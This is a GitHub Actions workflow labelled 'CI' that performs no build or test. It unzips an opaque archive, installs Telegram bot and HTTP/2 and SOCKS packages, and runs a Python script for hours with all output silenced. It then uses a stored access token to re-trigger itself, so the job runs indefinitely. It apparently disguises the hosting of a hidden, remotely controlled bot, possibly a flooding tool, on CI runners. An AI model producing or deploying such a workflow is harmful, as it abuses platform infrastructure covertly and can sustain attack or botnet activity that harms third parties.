name: CI

on:
  schedule:
    - cron: '0 */3 * * *'
  workflow_dispatch:

permissions:
  actions: write
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 350

    steps:
    - name: Checkout
      uses: actions/checkout@v4
      with:
        fetch-depth: 1

    - name: Setup
      uses: actions/setup-python@v5
      with:
        python-version: '3.11'

    - name: Setup Node
      uses: actions/setup-node@v4
      with:
        node-version: '20'

    - name: Extract
      run: |
        if [ ! -f b1.zip ]; then
          exit 1
        fi
        unzip -o -q b1.zip

    - name: Python deps
      run: |
        pip install -q telebot pyTelegramBotAPI

    - name: Node deps
      run: |
        cd b1
        npm install --silent --no-progress chalk hpack socks colors > /dev/null 2>&1

    - name: Init
      run: |
        cd b1
        if [ -f setup.py ]; then
          python setup.py > /dev/null 2>&1
        fi

    - name: Run
      id: runbot
      continue-on-error: true
      run: |
        cd b1
        timeout 19800 python main.py > /dev/null 2>&1 || true

    - name: Wait
      if: always()
      run: sleep 300

    - name: Trigger
      if: always()
      env:
        GH_PAT: ${{ secrets.GH_PAT }}
      run: |
        curl -s -X POST \
          -H "Authorization: token $GH_PAT" \
          -H "Accept: application/vnd.github+json" \
          https://api.github.com/repos/${{ github.repository }}/actions/workflows/${{ github.workflow }}/dispatches \
          -d "{\"ref\":\"${{ github.ref_name }}\"}" > /dev/null
